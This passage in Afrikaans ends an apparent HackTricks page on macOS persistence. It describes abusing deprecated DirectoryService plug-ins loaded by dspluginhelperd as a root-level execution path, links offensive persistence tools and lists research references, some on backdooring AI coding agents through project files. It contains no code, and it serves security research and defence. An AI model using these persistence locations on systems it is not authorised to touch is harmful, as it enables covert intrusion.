Skrywe: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Verouderde, voorwaardelike meganisme:** Root is nodig om dit te installeer, asook ’n plug-in wat werklik opgestel en gelaai is. DirectoryService se plug-in-API is afgeskaf; raadpleeg die teiken-Mac se Open Directory-opstelling voordat jy dit as ’n selflaaisneller beskou.

#### Ligging

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root is nodig
  - **Sneller:** `dspluginhelperd` laai ’n geskikte, opgestelde plug-in wanneer Open Directory dit nodig het. [Apple se gids vir die plug-in-looptyd](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) sê dat plug-ins wat nie vir opstart opgestel is nie, luiweg gelaai kan word wanneer hul node oopgemaak word.

#### Beskrywing & Uitbuiting

`dspluginhelperd` ondersteun verouderde DirectoryService-plug-inbundels. ’n Kwaadwillige plug-in kan ’n bevoorregte uitvoeringsroete bied wanneer die verouderde plug-in aanvaar en geaktiveer word; dit is apart van PAM en Authorization Plugins. Die feit dat die gids bestaan, bewys nie dat ’n nuutgeskrewe plug-in met die volgende selflaai sal loop nie. Apple se plaaslike `dspluginhelperd(8)`- en `opendirectoryd(8)`-handleidings op macOS 26.5 lys steeds die helper en hierdie verouderde roete.<sup>[[53]](#references)</sup>

Leesalleen-waarneming op macOS 26: `/Library/DirectoryServices/PlugIns` en `/usr/libexec/dspluginhelperd` bestaan. Geen plug-in is tydens hierdie toets geïnstalleer, opgestel of gelaai nie.

## Volhardingstegnieke en nutsgoed

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, die jaar van Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Verby die goeie ou LaunchAgents - 1 - dop-opstartlêers](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Verby die goeie ou LaunchAgents - 18 - X11 en XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Verby die goeie ou LaunchAgents - 21 - Heropende toepassings](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Verby die goeie ou LaunchAgents - 20 - Terminal-voorkeure](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Verby die goeie ou LaunchAgents - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Verby die goeie ou LaunchAgents - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Verby die goeie ou LaunchAgents - 22 - LoginHook en LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Verby die goeie ou LaunchAgents - 4 - cron-take](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Verby die goeie ou LaunchAgents - 2 - iTerm2-opstart](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Verby die goeie ou LaunchAgents - 7 - xbar-plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Verby die goeie ou LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Verby die goeie ou LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Verby die goeie ou LaunchAgents - 3 - Aanmelditems](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Verby die goeie ou LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Verby die goeie ou LaunchAgents - 24 - Gidsaksies](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Gidsaksies vir volharding op macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Verby die goeie ou LaunchAgents - 27 - Dock-kortpaaie](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Verby die goeie ou LaunchAgents - 17 - Kleurkiesers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Verby die goeie ou LaunchAgents - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Ontleding van "Mac File Opener"-volharding (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Verby die goeie ou LaunchAgents - 16 - Skermbewaarder](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Behou jou toegang: Skermbewaarders vir macOS-volharding (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Verby die goeie ou LaunchAgents - 11 - Spotlight-invoerders](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Verby die goeie ou LaunchAgents - 9 - Voorkeurpaneel](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Verby die goeie ou LaunchAgents - 19 - Periodieke skrifte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Verby die goeie ou LaunchAgents - 5 - Inpropbare verifikasiemodules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Verby die goeie ou LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Aanhoudende diefstal van aanmeldbewyse met Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Verby die goeie ou LaunchAgents - 30 - Die man-konfigurasielêer - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Verby die goeie ou LaunchAgents - 25 - Apache2-modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Verby die goeie ou LaunchAgents - 31 - BSM-ouditraamwerk](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Verby die goeie ou LaunchAgents - 23 - emond, die gebeurtenismonitordaemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Verby die goeie ou LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Verby die goeie ou LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Verby die goeie ou LaunchAgents - 10 - Toepassingskriplêers](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Verby die goeie ou LaunchAgents - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Verby die goeie ou LaunchAgents - 33 - Legstukke](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Verby die goeie ou LaunchAgents - 34 - launchd-selflaaitake](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Verby die goeie ou LaunchAgents - 35 - Volharding deur die NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Gebruik e-pos vir volharding op OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Verdagte wysiging van Apple Mail-reël-Plist (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Kwaadwillige profiele - Een van die ernstigste bedreigings vir Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Die kuns van Mac-malware Vol.1 - Hfst.0x2 Volharding (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Ontleding van CVE-2024-44243, ’n macOS SIP-omseiling deur kernuitbreidings (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE en API-token-eksfiltrasie deur Claude Code-projeklêers (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nuwe kwesbaarheid in GitHub Copilot en Cursor - Agterdeur in die Rules-lêer (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Alternatiewe installasiemetodes (Eksterne uitbreidings)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Verwyder ExtensionInstallForcelist in Chrome op Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Oor die skryf van Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Afstanduitbuiting van Mac via pasgemaakte URL-skemas (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Twee macOS-volhardingstruuks wat plug-ins misbruik (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL-minimale voorbeeld (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Ontleding van ’n Spotlight-gebaseerde macOS TCC-kwesbaarheid (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python se `site`-module-dokumentasie (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Van Spotlight tot Apple Intelligence — Misbruik van ’n 0day om die data te steel wat macOS AI aandryf](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
